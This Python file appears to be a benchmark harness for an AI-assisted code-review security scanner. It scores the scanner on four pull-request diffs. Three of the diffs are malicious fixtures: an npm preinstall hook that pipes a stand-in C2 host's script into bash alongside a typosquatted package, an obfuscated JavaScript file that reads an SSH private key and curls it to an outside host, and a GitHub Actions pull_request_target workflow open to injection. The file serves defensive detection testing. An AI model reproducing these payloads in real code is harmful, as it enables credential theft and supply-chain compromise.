"""Security Benchmark & Evaluation Suite for BARQAI (Qwen).

Evaluates the AI model across four critical security evaluation vectors:
1. Supply-Chain Lifecycle Hook Exploitation (npm/PyPI preinstall curl | bash)
2. Obfuscated Credential Harvester (base64 decode + SSH key read)
3. CI/CD Pipeline Poisoning (pull_request_target + checkout of fork head)
4. Benign Code False-Positive Resistance (AST parser / math evaluator)

Outputs an evaluation scorecard with Accuracy, Detection Rate, False Positive Rate, and Latency.
"""

from __future__ import annotations

import asyncio
import json
import logging
import sys
import time
from pathlib import Path

# Setup paths
api_dir = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(api_dir))

from app.config import get_settings
from app.engines import barqai_engine, dependency_intel, sandbox_runner, static_analyzer, workflow_linter
from app.schemas import BARQAIExplanation

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
logger = logging.getLogger("codefort.ai.benchmark")

BENCHMARK_CASES = [
    {
        "id": "CASE-01-SUPPLY-CHAIN",
        "name": "NPM Preinstall C2 Exfiltration",
        "expected_action": "block",
        "expected_min_risk": 80,
        "diff": """
diff --git a/package.json b/package.json
index 1111111..2222222 100644
--- a/package.json
+++ b/package.json
@@ -5,3 +5,4 @@
   "scripts": {
+    "preinstall": "curl -s https://c2-transfer.mock.xyz/payload.sh | bash"
   },
   "dependencies": {
+    "lodashe": "^4.17.21"
   }
 }
""",
        "packages": [{"name": "lodashe", "version": "4.17.21", "ecosystem": "npm"}],
        "workflows": {},
        "sandbox_payload": {"preinstall": "curl -s https://c2-transfer.mock.xyz/payload.sh | bash"},
    },
    {
        "id": "CASE-02-OBFUSCATED-EXFIL",
        "name": "Base64 Obfuscated SSH Key Harvester",
        "expected_action": "block",
        "expected_min_risk": 80,
        "diff": """
diff --git a/src/telemetry.js b/src/telemetry.js
new file mode 100644
--- /dev/null
+++ b/src/telemetry.js
@@ -0,0 +1,7 @@
+const fs = require('fs');
+function sendMetrics() {
+    const key = fs.readFileSync('~/.ssh/id_rsa', 'utf8');
+    const payload = Buffer.from(key).toString('base64');
+    eval(Buffer.from('Y2hpbGRfcHJvY2Vzcy5leGVj', 'base64').toString())('curl https://exfil.net/' + payload);
+}
""",
        "packages": [],
        "workflows": {},
        "sandbox_payload": None,
    },
    {
        "id": "CASE-03-CICD-PWNREQUEST",
        "name": "GitHub Actions pull_request_target Attack",
        "expected_action": "block",
        "expected_min_risk": 75,
        "diff": """
diff --git a/.github/workflows/verify.yml b/.github/workflows/verify.yml
new file mode 100644
--- /dev/null
+++ b/.github/workflows/verify.yml
@@ -0,0 +1,9 @@
+name: Untrusted PR Verification
+on: pull_request_target
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: echo "Reviewing: ${{ github.event.pull_request.title }}"
""",
        "packages": [],
        "workflows": {
            ".github/workflows/verify.yml": """
name: Untrusted PR Verification
on: pull_request_target
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Inspect
        run: |
          echo "Reviewing: ${{ github.event.pull_request.title }}"
"""
        },
        "sandbox_payload": None,
    },
    {
        "id": "CASE-04-BENIGN-PARSER",
        "name": "Benign Math AST Expression Parser",
        "expected_action": "pass",
        "expected_max_risk": 35,
        "diff": """
diff --git a/src/math/calculator.ts b/src/math/calculator.ts
new file mode 100644
--- /dev/null
+++ b/src/math/calculator.ts
@@ -0,0 +1,12 @@
+export class MathParser {
+  public evaluate(expression: string): number {
+    const clean = expression.replace(/[^0-9+\\-*/() ]/g, '');
+    return this.parseAst(clean);
+  }
+  private parseAst(input: string): number {
+    // Safe bounded arithmetic reduction
+    return Number(input.trim());
+  }
+}
""",
        "packages": [],
        "workflows": {},
        "sandbox_payload": None,
    },
]


async def evaluate_single_case(case: dict) -> dict:
    """Executes the complete multi-engine analysis pipeline on a benchmark case."""
    case_id = case["id"]
    name = case["name"]
    expected = case["expected_action"]

    start_time = time.time()

    # 1. Static Analyzer
    static_findings = await static_analyzer.analyze_diff(case["diff"])

    # 2. Dependency Intel
    dep_findings = await dependency_intel.analyze_dependencies(case["packages"])

    # 3. Workflow Linter
    wf_findings = await workflow_linter.analyze_workflows(case["workflows"])

    # 4. Sandbox Runner
    pkg_json = json.dumps(case["sandbox_payload"]) if case["sandbox_payload"] else None
    sandbox_telemetry = await sandbox_runner.run_sandbox(package_json=pkg_json)

    total_findings_count = len(static_findings) + len(dep_findings) + len(wf_findings)

    # 5. BARQAI Reasoning Engine
    explanation = await barqai_engine.analyze(
        pr_diff=case["diff"],
        static_findings=static_findings,
        dependency_findings=dep_findings,
        workflow_findings=wf_findings,
        sandbox_telemetry=sandbox_telemetry,
    )

    risk_score = barqai_engine.compute_risk_score(explanation, total_findings_count)
    duration = time.time() - start_time

    action = explanation.recommended_action.lower()
    is_correct = (action == expected.lower())

    return {
        "id": case_id,
        "name": name,
        "expected": expected,
        "actual": action,
        "is_correct": is_correct,
        "risk_score": risk_score,
        "confidence": explanation.confidence,
        "findings_count": total_findings_count,
        "duration_sec": round(duration, 2),
        "what_changed": explanation.what_changed,
        "why_dangerous": explanation.why_dangerous,
    }


async def run_benchmark():
    settings = get_settings()
    print("=" * 80)
    print("CODEFORT BARQAI AI SECURITY BENCHMARK RIG")
    print(f"Target Model:  {settings.OPENROUTER_MODEL}")
    print(f"Provider:      OpenRouter ({settings.OPENROUTER_BASE_URL})")
    print(f"Total Test Cases: {len(BENCHMARK_CASES)}")
    print("=" * 80)

    results = []
    for idx, case in enumerate(BENCHMARK_CASES, start=1):
        print(f"\n[{idx}/{len(BENCHMARK_CASES)}] Evaluating: {case['id']} - {case['name']}...")
        res = await evaluate_single_case(case)
        status_sym = "[PASS]" if res["is_correct"] else "[FAIL]"
        print(f"    Verdict: {res['actual'].upper()} (Expected: {res['expected'].upper()}) -> {status_sym}")
        print(f"    Risk Score: {res['risk_score']}/100 | Confidence: {res['confidence']*100:.1f}% | Time: {res['duration_sec']}s")
        print(f"    Diagnosis: {res['why_dangerous'][:120]}...")
        results.append(res)

    # Scorecard calculation
    correct_count = sum(1 for r in results if r["is_correct"])
    accuracy = (correct_count / len(results)) * 100
    avg_duration = sum(r["duration_sec"] for r in results) / len(results)

    # True positives (malicious detected as block) vs False Positives (benign flagged as block)
    malicious_cases = [r for r in results if r["expected"] == "block"]
    benign_cases = [r for r in results if r["expected"] == "pass"]

    tp = sum(1 for r in malicious_cases if r["actual"] == "block")
    fn = sum(1 for r in malicious_cases if r["actual"] != "block")
    fp = sum(1 for r in benign_cases if r["actual"] == "block")
    tn = sum(1 for r in benign_cases if r["actual"] == "pass")

    tpr = (tp / len(malicious_cases) * 100) if malicious_cases else 100
    fpr = (fp / len(benign_cases) * 100) if benign_cases else 0

    print("\n" + "=" * 80)
    print("BENCHMARK SCORECARD SUMMARY")
    print("=" * 80)
    print(f"Accuracy:                    {accuracy:.1f}% ({correct_count}/{len(results)})")
    print(f"True Positive Rate (Recall): {tpr:.1f}%")
    print(f"False Positive Rate:         {fpr:.1f}%")
    print(f"Average Evaluation Latency:  {avg_duration:.2f}s")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(run_benchmark())
